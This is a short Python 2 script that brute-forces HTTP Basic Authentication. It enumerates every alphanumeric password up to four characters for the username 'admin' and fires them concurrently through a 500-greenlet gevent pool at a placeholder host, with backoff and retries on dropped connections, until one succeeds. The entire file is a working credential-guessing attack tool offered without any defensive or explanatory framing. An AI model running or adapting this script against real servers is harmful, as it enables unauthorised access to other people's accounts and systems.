import string
from socket import error as SocketError
import errno

from gevent import monkey
from gevent.pool import Pool
import requests
from requests.exceptions import ConnectionError
import backoff
import itertools

monkey.patch_ssl()
monkey.patch_socket()

HOST = 'http://example.com'
USERNAME = 'admin'

universe = string.digits + string.letters  # + string.punctuation
found = False
retry = []


def grouper(iterable, n, fillvalue=None):
    # grouper('ABCDEFG', 3, 'x') --> ABC DEF Gxx
    args = [iter(iterable)] * n
    return itertools.izip_longest(fillvalue=fillvalue, *args)


def generate_passwd(length=1):
    l = []
    res = itertools.product(universe, repeat=length)
    for i in res:
        l.append(''.join(i))
    return l


@backoff.on_exception(backoff.expo, ConnectionError, max_tries=50)
def force(passwd):
    global found
    if not found:
        try:
            r = requests.get(HOST, auth=(USERNAME, passwd))
            if r.ok:
                print('PASSWD: %s' % passwd)
                found = True
        except SocketError as e:
            if e.errno != errno.ECONNRESET:
                raise e
            retry.append(passwd)


generated = []
for i in xrange(0, 5):
    print('generating %s chars long passwords' % i)
    generated += generate_passwd(i)


n = 500
pool = Pool(n)
groups = grouper(generated, n)
total = len(generated)
tried = 0

for passwds in groups:
    [pool.spawn(force, passwd) for passwd in passwds]
    tried += len(passwds)
    if not found:
        print('Tried %s (%s) of (%s)' % (tried, len(passwds), total))

if not found:
    print('There are %s passwords left' % len(retry))
    for passwd in retry:
        force(passwd)
